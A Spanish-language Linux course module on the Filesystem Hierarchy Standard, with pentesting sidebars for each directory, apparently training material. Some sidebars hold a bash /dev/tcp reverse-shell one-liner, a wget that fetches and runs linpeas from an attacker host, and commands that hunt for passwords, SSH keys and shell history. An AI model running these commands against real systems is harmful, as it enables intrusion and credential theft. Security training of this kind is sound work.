---
title: "📁 Curso de Linux — Módulo 2: Estructura del Sistema de Archivos (FHS)"
aliases:
  - Linux FHS
  - Filesystem Hierarchy Standard
  - Jerarquia Linux
tags:
  - ifct0109/pocs
  - linux
  - fhs
  - filesystem
  - kali
---

# 📁 Curso de Linux — Módulo 2: Estructura del Sistema de Archivos (FHS)

> [!abstract] Resumen del Módulo
> Comprender la organización jerárquica de directorios en Linux según el estándar **FHS (Filesystem Hierarchy Standard)** es crucial para la auditoría técnica y el pentesting. Conocer la función de `/bin`, `/etc`, `/proc`, `/sys`, `/var/log` y `/dev` permite al auditor orientarse rápidamente durante la fase de reconocimiento local y post-explotación.

---

# Módulo - Estructura del Sistema de Archivos

Jerarquía FHS y Navegación en Linux

  ← Volver al Índice

## 📁 ¿Qué es el FHS?

> [!warning] 🎯 Filesystem Hierarchy Standard (FHS)
>        El  FHS  es un estándar que define la estructura de directorios en sistemas Linux y Unix. Establece qué tipo de archivos van en cada directorio y cómo debe organizarse el sistema de archivos.
>
>         ¿Por qué es importante?
>
>          ✅ Todos los sistemas Linux siguen la misma estructura (coherencia)
>          ✅ Facilita la administración del sistema
>          ✅ Las aplicaciones saben dónde buscar archivos de configuración, binarios, logs, etc.
>          ✅  Esencial para pentesting:  Saber dónde buscar información sensible, configuraciones, logs, binarios vulnerables

### 🌳 Árbol de Directorios en Linux

A diferencia de Windows (C:\, D:\, E:\), en Linux **TODO** parte de un único punto llamado **raíz** (`/`).

```bash
<span class="dir">/</span> (raíz) - El directorio principal, donde comienza todo
├── <span class="dir">bin</span>      → Binarios esenciales del sistema
├── <span class="dir">boot</span>     → Archivos del gestor de arranque (GRUB, kernel)
├── <span class="dir">dev</span>      → Dispositivos (discos, USB, terminales)
├── <span class="importante">etc</span>      → <strong>Archivos de configuración del sistema</strong>
├── <span class="dir">home</span>     → Directorios personales de usuarios
│   ├── tecnico/
│   ├── juan/
│   └── maria/
├── <span class="dir">lib</span>      → Librerías compartidas esenciales
├── <span class="dir">media</span>    → Puntos de montaje automáticos (USB, CD)
├── <span class="dir">mnt</span>      → Puntos de montaje temporales
├── <span class="dir">opt</span>      → Software opcional de terceros
├── <span class="dir">proc</span>     → Sistema de archivos virtual (información del kernel)
├── <span class="importante">root</span>     → <strong>Directorio personal del usuario root</strong>
├── <span class="dir">run</span>      → Datos de tiempo de ejecución
├── <span class="dir">sbin</span>     → Binarios de administración del sistema
├── <span class="dir">srv</span>      → Datos de servicios (web, FTP)
├── <span class="dir">sys</span>      → Sistema de archivos virtual (hardware)
├── <span class="importante">tmp</span>      → <strong>Archivos temporales (cualquiera puede escribir)</strong>
├── <span class="dir">usr</span>      → Programas y datos de usuario (la mayoría del software)
│   ├── bin/
│   ├── lib/
│   ├── local/
│   └── share/
└── <span class="importante">var</span>      → <strong>Datos variables (logs, bases de datos, caché)</strong>
    ├── log/  → Archivos de registro
    ├── www/  → Contenido de sitios web
    └── tmp/  → Temporales persistentes
```

## 🗂️ Directorios Principales - Explicación Detallada

### 📂 `/` - Raíz (Root Directory)

El directorio raíz es el **punto de partida** de todo el sistema de archivos. Todos los demás directorios y archivos están "dentro" de la raíz.

# Ver contenido de la raíz:
tecnico@linux:~$ ls -l /
total 64
drwxr-xr-x   2 root root  4096 Feb  7 10:00 bin
drwxr-xr-x   3 root root  4096 Feb  7 09:45 boot
drwxr-xr-x  18 root root  3840 Feb  8 08:30 dev
drwxr-xr-x 130 root root 12288 Feb  8 10:15 etc
drwxr-xr-x   3 root root  4096 Jan 15 14:20 home
...

# Ruta absoluta vs relativa:
# /home/tecnico/documento.txt  → Ruta absoluta (desde la raíz)
# ./documento.txt              → Ruta relativa (desde donde estás)

> [!warning] ⚠️ Importante:  NO confundir `/` (raíz del sistema) con `/root` (directorio personal del usuario root)

### ⚙️ `/bin` - Binarios Esenciales

Contiene comandos **esenciales** del sistema que necesitan estar disponibles para todos los usuarios, incluso en modo de recuperación.

**Comandos típicos en /bin:**

* `ls`, `cp`, `mv`, `rm` - Gestión de archivos

* `cat`, `grep`, `sed` - Procesamiento de texto

* `bash`, `sh` - Shells

* `ps`, `kill` - Gestión de procesos

# Ver binarios en /bin:
tecnico@linux:~$ ls /bin | head -10
bash
cat
chmod
cp
date
dd
df
echo
grep
gunzip

# Ver dónde está un comando:
tecnico@linux:~$ which ls
/usr/bin/ls

# Nota: En sistemas modernos, /bin suele ser un enlace simbólico a /usr/bin
tecnico@linux:~$ ls -ld /bin
lrwxrwxrwx 1 root root 7 Jan 10 10:00 /bin -> usr/bin

### 🚀 `/boot` - Archivos de Arranque

Contiene todo lo necesario para **arrancar el sistema**: kernel de Linux, imagen inicial del sistema de archivos (initrd/initramfs), configuración del gestor de arranque (GRUB).

# Ver contenido de /boot:
tecnico@linux:~$ ls -lh /boot
-rw-r--r-- 1 root root 248K Jan 15 2024 config-6.1.0-kali7-amd64
drwxr-xr-x 5 root root 4.0K Feb  7 10:00 grub
-rw-r--r-- 1 root root  28M Jan 15 2024 initrd.img-6.1.0-kali7-amd64
-rw-r--r-- 1 root root 7.5M Jan 15 2024 vmlinuz-6.1.0-kali7-amd64

# vmlinuz = Kernel de Linux (comprimido)
# initrd/initramfs = Sistema de archivos inicial
# grub/ = Configuración del gestor de arranque

#### 🎯 Pentesting: ¿Por qué importa /boot?

* Modificar GRUB puede permitir arrancar en modo single-user (obtener shell de root sin contraseña)

* Analizar versiones del kernel para buscar exploits conocidos

### 💾 `/dev` - Dispositivos (Devices)

Contiene archivos especiales que representan **dispositivos hardware** y **pseudo-dispositivos**. En Linux, "todo es un archivo", incluidos los dispositivos.

**Dispositivos comunes:**

* `/dev/sda`, `/dev/sdb` - Discos duros SATA

* `/dev/sda1`, `/dev/sda2` - Particiones del disco

* `/dev/nvme0n1` - Discos NVMe (SSD modernos)

* `/dev/tty`, `/dev/pts/*` - Terminales

* `/dev/null` - "Agujero negro" (descarta todo)

* `/dev/zero` - Produce ceros infinitos

* `/dev/random`, `/dev/urandom` - Generadores de números aleatorios

# Ver dispositivos de disco:
tecnico@linux:~$ ls -l /dev/sd*
brw-rw---- 1 root disk 8,  0 Feb  8 08:30 /dev/sda
brw-rw---- 1 root disk 8,  1 Feb  8 08:30 /dev/sda1
brw-rw---- 1 root disk 8,  2 Feb  8 08:30 /dev/sda2

# Redirigir salida a /dev/null (descartar):
tecnico@linux:~$ echo "Esto se pierde" > /dev/null

# Generar 10 bytes aleatorios:
tecnico@linux:~$ head -c 10 /dev/urandom | base64
xJ4mP9kLqA==

#### 🎯 Pentesting: /dev en Ataques

* `/dev/tcp/` - Pseudo-dispositivo para crear conexiones TCP (reverse shells sin netcat)

* Acceso a `/dev/mem` o `/dev/kmem` puede permitir leer/escribir memoria del kernel

# Reverse shell usando solo Bash y /dev/tcp:
usuario@target:~$ bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
# No requiere netcat ni herramientas adicionales

### ⚙️ `/etc` - Configuración del Sistema

**El directorio MÁS importante para pentesting.** Contiene TODOS los archivos de configuración del sistema.

**Archivos críticos en /etc:**

| Archivo/Directorio | Contenido | Importancia Pentesting |
| --- | --- | --- |
| `/etc/passwd` | Lista de usuarios del sistema | 🔴 Enumeración de usuarios |
| `/etc/shadow` | Contraseñas hasheadas | 🔴 Objetivo para cracking |
| `/etc/group` | Grupos del sistema | 🔴 Enumeración de privilegios |
| `/etc/sudoers` | Configuración de sudo | 🔴 Escalada de privilegios |
| `/etc/hosts` | Resolución DNS local | 🟠 Reconocimiento de red |
| `/etc/hostname` | Nombre del host | 🟡 Identificación del sistema |
| `/etc/network/` | Configuración de red | 🟠 Información de red |
| `/etc/ssh/` | Configuración SSH | 🔴 Claves privadas, configuración |
| `/etc/crontab` | Tareas programadas del sistema | 🔴 Persistencia, escalada |
| `/etc/fstab` | Sistemas de archivos montados | 🟡 Reconocimiento de discos |
| `/etc/resolv.conf` | Servidores DNS | 🟡 Configuración de red |
| `/etc/apache2/` | Configuración Apache | 🟠 Configuración de servidor web |
| `/etc/nginx/` | Configuración Nginx | 🟠 Configuración de servidor web |
| `/etc/mysql/` | Configuración MySQL | 🟠 Credenciales de BD |

# Ver usuarios del sistema:
tecnico@linux:~$ cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

# /etc/shadow solo lo puede leer root:
tecnico@linux:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Ver configuración SSH:
tecnico@linux:~$ cat /etc/ssh/sshd_config | grep -i permit
PermitRootLogin yes
PermitEmptyPasswords no

#### 🎯 Pentesting: /etc es el Tesoro

**Primera acción en un sistema comprometido:** Enumerar /etc

# Buscar archivos interesantes en /etc:
usuario@target:~$ find /etc -type f -readable 2>/dev/null | grep -E 'passwd|shadow|sudo|ssh|cron'

# Buscar credenciales hardcodeadas:
usuario@target:~$ grep -r "password" /etc/ 2>/dev/null

# Backup de /etc/passwd que tal vez tengas permisos de leer:
usuario@target:~$ cat /etc/passwd- 2>/dev/null

### 🏠 `/home` - Directorios de Usuarios

Contiene los **directorios personales** de todos los usuarios normales del sistema. Cada usuario tiene su carpeta en `/home/nombre_usuario`.

# Ver usuarios en /home:
tecnico@linux:~$ ls -l /home
drwxr-x--- 5 tecnico tecnico 4096 Feb  8 10:00 tecnico
drwxr-x--- 3 juan    juan    4096 Jan 20 14:30 juan
drwxr-x--- 4 maria   maria   4096 Feb  1 09:15 maria

# Tu directorio personal:
tecnico@linux:~$ echo $HOME
/home/tecnico

# Atajo al home:
tecnico@linux:~$ cd ~
tecnico@linux:~$ pwd
/home/tecnico

**Archivos típicos en /home/usuario:**

* `.bashrc` - Configuración de Bash

* `.bash_history` - Historial de comandos

* `.ssh/` - Claves SSH privadas/públicas

* `.profile` - Configuración del perfil de usuario

* `Desktop/`, `Documents/`, `Downloads/` - Carpetas típicas

#### 🎯 Pentesting: Archivos Sensibles en /home

# Buscar historial de comandos (puede tener contraseñas):
usuario@target:~$ cat ~/.bash_history | grep -i password

# Buscar claves SSH privadas:
usuario@target:~$ find /home -name "id_rsa" 2>/dev/null
/home/juan/.ssh/id_rsa

# Buscar archivos de configuración con credenciales:
usuario@target:~$ grep -r "password" /home/usuario/ 2>/dev/null

### 👑 `/root` - Directorio del Usuario Root

El directorio personal del usuario **root** (administrador). A diferencia de los usuarios normales que están en `/home`, root tiene su propio directorio en `/root`.

# Como usuario normal, NO puedes acceder:
tecnico@linux:~$ ls /root
ls: cannot open directory '/root': Permission denied

# Como root sí:
root@linux:~# ls -la /root
drwx------  5 root root 4096 Feb  8 10:00 .
drwxr-xr-x 18 root root 4096 Jan 10 09:00 ..
-rw-------  1 root root  256 Feb  7 14:20 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jan 15 10:00 .ssh

#### 🎯 Pentesting: /root es el Santo Grial

Si logras acceder a `/root`, significa que **ya eres root**. Aquí encontrarás:

* Historial de comandos del administrador

* Claves SSH privadas de root

* Scripts de administración

* Archivos de configuración personalizados

### 📚 `/lib` - Librerías Compartidas

Contiene **librerías compartidas** esenciales para los binarios en `/bin` y `/sbin`. Son el equivalente a los archivos .dll en Windows.

# Ver librerías:
tecnico@linux:~$ ls /lib/x86_64-linux-gnu/ | head -5
libc.so.6
libdl.so.2
libm.so.6
libpthread.so.0
librt.so.1

# Ver qué librerías usa un programa:
tecnico@linux:~$ ldd /bin/ls
linux-vdso.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
/lib64/ld-linux-x86-64.so.2

### 💿 `/media` - Montaje Automático de Medios

Punto de montaje para **dispositivos extraíbles** que se montan automáticamente (USB, CD/DVD, discos externos).

# Cuando conectas un USB, se monta aquí:
tecnico@linux:~$ ls /media/tecnico/
USB_DRIVE/
DATOS_EXTERNOS/

### 🔌 `/mnt` - Montajes Temporales

Directorio tradicional para **montar temporalmente** sistemas de archivos (discos, particiones, recursos de red).

# Montar una partición manualmente:
tecnico@linux:~$ sudo mount /dev/sdb1 /mnt
tecnico@linux:~$ ls /mnt
archivos_del_disco/

# Desmontar:
tecnico@linux:~$ sudo umount /mnt

### 📦 `/opt` - Software Opcional

Directorio para **software de terceros** que no es parte del sistema operativo base. Aplicaciones comerciales y paquetes grandes suelen instalarse aquí.

# Software típico en /opt:
tecnico@linux:~$ ls /opt
google/
teams/
slack/
custom_app/

#### 🎯 Pentesting: /opt puede contener aplicaciones custom

Scripts y aplicaciones personalizadas en /opt pueden tener vulnerabilidades o configuraciones inseguras.

### 🖥️ `/proc` - Sistema de Archivos Virtual

NO es un directorio real en disco, es un **sistema de archivos virtual** que proporciona información sobre procesos y el kernel en tiempo real.

# Ver información del sistema:
tecnico@linux:~$ cat /proc/cpuinfo | head -10
processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 142
model name      : Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
...

# Ver memoria:
tecnico@linux:~$ cat /proc/meminfo | head -5
MemTotal:       16291832 kB
MemFree:         8234512 kB
MemAvailable:   12456789 kB
...

# Ver versión del kernel:
tecnico@linux:~$ cat /proc/version
Linux version 6.1.0-kali7-amd64 (devel@kali.org) (gcc-12 ...

# Cada proceso tiene su carpeta:
tecnico@linux:~$ ls /proc | head -10
1
10
1234
1456
...

# Ver información de un proceso específico:
tecnico@linux:~$ cat /proc/1/cmdline
/sbin/init

#### 🎯 Pentesting: /proc es una Mina de Oro

# Ver línea de comandos de todos los procesos:
usuario@target:~$ for pid in /proc/[0-9]*; do cat $pid/cmdline 2>/dev/null; echo; done

# Puede revelar contraseñas en comandos:
mysql -u admin -p supersecret123

# Ver variables de entorno de un proceso:
usuario@target:~$ cat /proc/1234/environ

# Ver información de red:
usuario@target:~$ cat /proc/net/tcp
usuario@target:~$ cat /proc/net/route

### 🔧 `/sbin` - Binarios de Sistema

Similar a `/bin`, pero contiene binarios de **administración del sistema** que normalmente solo ejecuta root.

# Comandos típicos en /sbin:
tecnico@linux:~$ ls /sbin | head -10
fdisk
fsck
ifconfig
init
iptables
mkfs
modprobe
reboot
route
shutdown

### 🗑️ `/tmp` - Archivos Temporales

Directorio para **archivos temporales**. Cualquier usuario puede escribir aquí. Los archivos suelen borrarse al reiniciar el sistema.

# Ver permisos de /tmp:
tecnico@linux:~$ ls -ld /tmp
drwxrwxrwt 10 root root 4096 Feb  8 10:30 /tmp
#         ↑ 't' = sticky bit (solo puedes borrar tus archivos)

# Todos pueden escribir:
tecnico@linux:~$ touch /tmp/mi_archivo.txt
# ✅ Funciona

#### 🎯 Pentesting: /tmp para Exfiltración y Ejecución

# Subir herramientas (siempre puedes escribir en /tmp):
usuario@target:~$ wget http://10.10.10.5/linpeas.sh -O /tmp/linpeas.sh
usuario@target:~$ chmod +x /tmp/linpeas.sh
usuario@target:~$ /tmp/linpeas.sh

# Compilar exploits:
usuario@target:~$ gcc exploit.c -o /tmp/exploit
usuario@target:~$ /tmp/exploit

### 👥 `/usr` - Recursos de Usuario

Contiene la **mayoría del software** instalado en el sistema. Es el directorio más grande.

**Subdirectorios importantes:**

* `/usr/bin` - Binarios de usuario (la mayoría de comandos)

* `/usr/sbin` - Binarios de administración

* `/usr/lib` - Librerías

* `/usr/local` - Software instalado localmente (compilado desde fuente)

* `/usr/share` - Datos compartidos (documentación, iconos, etc.)

* `/usr/include` - Archivos de cabecera C/C++

# Ver tamaño de /usr:
tecnico@linux:~$ du -sh /usr
8.5G    /usr

# Mayoría de comandos están en /usr/bin:
tecnico@linux:~$ ls /usr/bin | wc -l
2543

### 📊 `/var` - Datos Variables

Contiene archivos cuyo contenido **varía constantemente**: logs, bases de datos, caché, colas de impresión, correo, etc.

**Subdirectorios críticos:**

| Directorio | Contenido | Pentesting |
| --- | --- | --- |
| `/var/log` | Archivos de registro del sistema | 🔴 Logs de acceso, errores, autenticación |
| `/var/www` | Contenido de sitios web (Apache/Nginx) | 🔴 Webshells, configuraciones |
| `/var/mail` | Correos de usuarios | 🟠 Información sensible |
| `/var/tmp` | Temporales persistentes (no se borran al reiniciar) | 🟠 Persistencia |
| `/var/backups` | Copias de seguridad del sistema | 🟠 Archivos antiguos, credenciales |
| `/var/spool/cron` | Cron jobs de usuarios | 🔴 Persistencia, escalada |

# Ver logs del sistema:
tecnico@linux:~$ ls /var/log
auth.log       → Autenticaciones (SSH, sudo)
syslog         → Log general del sistema
kern.log       → Mensajes del kernel
apache2/       → Logs del servidor web
mysql/         → Logs de MySQL
...

# Ver últimos intentos de login:
tecnico@linux:~$ sudo tail /var/log/auth.log
Feb  8 10:15:32 linux sshd[1234]: Accepted password for tecnico from 192.168.1.100
Feb  8 10:20:45 linux sudo: tecnico : TTY=pts/0 ; PWD=/home/tecnico ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

#### 🎯 Pentesting: /var es Crucial

# Buscar logs accesibles:
usuario@target:~$ find /var/log -type f -readable 2>/dev/null

# Buscar contraseñas en logs:
usuario@target:~$ grep -r "password" /var/log 2>/dev/null

# Ver logs de Apache para reconocimiento:
usuario@target:~$ cat /var/log/apache2/access.log | tail -20

# Buscar backups con credenciales:
usuario@target:~$ ls -la /var/backups
-rw-r--r-- 1 root root 2453 Feb  7 03:00 passwd.bak
-rw------- 1 root shadow 1234 Feb  7 03:00 shadow.bak

## 🐉 Kali Linux: Estructura Específica

### 🛠️ Herramientas de Kali Linux

Kali Linux tiene una estructura similar a Debian, pero incluye directorios y herramientas específicas para pentesting.

**Ubicaciones de herramientas en Kali:**

| Directorio | Herramientas | Ejemplos |
| --- | --- | --- |
| `/usr/bin` | La mayoría de herramientas | nmap, sqlmap, john, hydra, nikto |
| `/usr/share` | Datos y scripts de herramientas | wordlists, exploits, payloads |
| `/usr/share/wordlists` | Diccionarios para cracking | rockyou.txt, dirb wordlists |
| `/usr/share/metasploit-framework` | Metasploit Framework | Módulos, exploits, payloads |
| `/usr/share/nmap` | Scripts NSE de Nmap | Scripts de enumeración y exploits |
| `/usr/share/webshells` | Web shells | PHP, ASP, JSP shells |

# Ver herramientas instaladas:
┌──(kali㉿kali)-[~]
└─$ ls /usr/bin | grep -E 'nmap|sqlmap|john|hydra|nikto'
hydra
john
nmap
nikto
sqlmap

# Wordlists más famosas:
┌──(kali㉿kali)-[~]
└─$ ls -lh /usr/share/wordlists
lrwxrwxrwx 1 root root   32 Jan 15 10:00 rockyou.txt.gz -> /usr/share/wordlists/rockyou.txt.gz
drwxr-xr-x 2 root root 4.0K Jan 15 10:00 dirb/
drwxr-xr-x 2 root root 4.0K Jan 15 10:00 dirbuster/
...

# Descomprimir rockyou.txt (si está comprimido):
┌──(kali㉿kali)-[~]
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Ver scripts NSE de Nmap:
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/nmap/scripts | head -10
afp-brute.nse
ftp-anon.nse
http-enum.nse
smb-vuln-ms17-010.nse
ssh-brute.nse
...

# Metasploit Framework:
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/metasploit-framework/modules
auxiliary/  encoders/  exploits/  nops/  payloads/  post/

> [!warning] 💡 Ubicaciones Clave en Kali
>
>           /usr/share/wordlists/rockyou.txt  - La wordlist más famosa (14+ millones de passwords)
>           /usr/share/webshells  - Web shells para post-explotación
>           /usr/share/seclists  - Colección masiva de listas (si instalas seclists)
>           /root/.msf4  - Configuración de Metasploit
>           /root/.ssh  - Claves SSH de root

## 🎯 Resumen Rápido para Pentesting

#### 🔴 Directorios CRÍTICOS que siempre debes revisar:

* /etc - Configuraciones, usuarios, contraseñas, cron jobs

* /var/log - Logs del sistema (autenticación, accesos, errores)

* /var/www - Archivos del servidor web

* /home - Archivos personales, historiales, claves SSH

* /root - Santo grial si logras acceso

* /tmp - Subir y ejecutar herramientas

* /proc - Información de procesos y kernel

* /opt - Aplicaciones custom potencialmente vulnerables

> [!warning] 🎯 Comandos Esenciales de Reconocimiento
>
>  # Enumerar todo el sistema de archivos:
>  usuario@target:~$  ls -la /
>
>  # Buscar archivos modificados recientemente:
>  usuario@target:~$  find / -type f -mtime -1 2>/dev/null
>
>  # Buscar archivos de configuración:
>  usuario@target:~$  find /etc -type f -readable 2>/dev/null
>
>  # Buscar archivos con "password" en el nombre:
>  usuario@target:~$  find / -name "*password*" 2>/dev/null
>
>  # Ver espacio en disco:
>  usuario@target:~$  df -h
>
>  # Ver sistemas de archivos montados:
>  usuario@target:~$  cat /proc/mounts

  ← Volver al Índice

Módulo - Estructura del Sistema de Archivos - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🔗 Navegación y Siguiente Módulo
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
* ⬅️ Anterior: [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux - Introducción y Entorno|Módulo 1: Introducción y Entorno]]
* 💻 Siguiente: [[02 - MODULOS/Prácticas (PoCs)/Linux/03 - Curso de Linux - Comandos Esenciales de Sistema|Módulo 3: Comandos Esenciales de Sistema]]
